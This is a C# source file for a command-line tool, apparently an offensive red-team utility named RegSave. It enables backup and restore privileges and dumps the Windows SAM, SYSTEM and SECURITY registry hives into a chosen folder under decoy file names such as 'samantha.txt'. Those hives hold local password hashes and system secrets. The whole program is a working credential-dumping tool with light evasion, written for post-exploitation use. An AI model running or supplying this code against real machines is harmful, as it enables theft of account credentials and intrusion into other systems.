using System;
using System.IO;

namespace RegSave
{
    internal class Program
    {
        public static void Usage()
        {
            Console.WriteLine("Usage: RegSave.exe path\n" +
                "Example:\n" +
                "   RegSave.exe C:\\Path\\To\\Directory\n" +
                "Note:\n" +
                "   Requires running in high integrity level.\n");
            Environment.Exit(1); //Be careful if running without fork & run
        }

        private static void DumpReg(string path)
        {
            try
            {
                Privileges.EnableDisablePrivilege("SeBackupPrivilege", true);
                Privileges.EnableDisablePrivilege("SeRestorePrivilege", true);
                Reg.ExportRegKey("SAM", Path.Combine(path, "samantha.txt"));
                Reg.ExportRegKey("SYSTEM", Path.Combine(path, "systemless.txt"));
                Reg.ExportRegKey("SECURITY", Path.Combine(path, "secundum.txt"));
            } catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        private static void Main(string[] args)
        {
            if (!Privileges.IsHighIntegrity())
            {
                Console.WriteLine("\n[!] Not running in high integrity process.\n");
                Usage();
            }

            if (args.Length != 1)
            {
                Console.WriteLine("\n[!] Invalid number of arguments.\n");
                Usage();
            }
            else
            {
                string path = args[0];

                if (!Directory.Exists(path))
                {
                    Console.WriteLine("\n[!] Invalid path '{0}'\n", path);
                    Usage();
                }

                DumpReg(path);
            }
        }
    }
}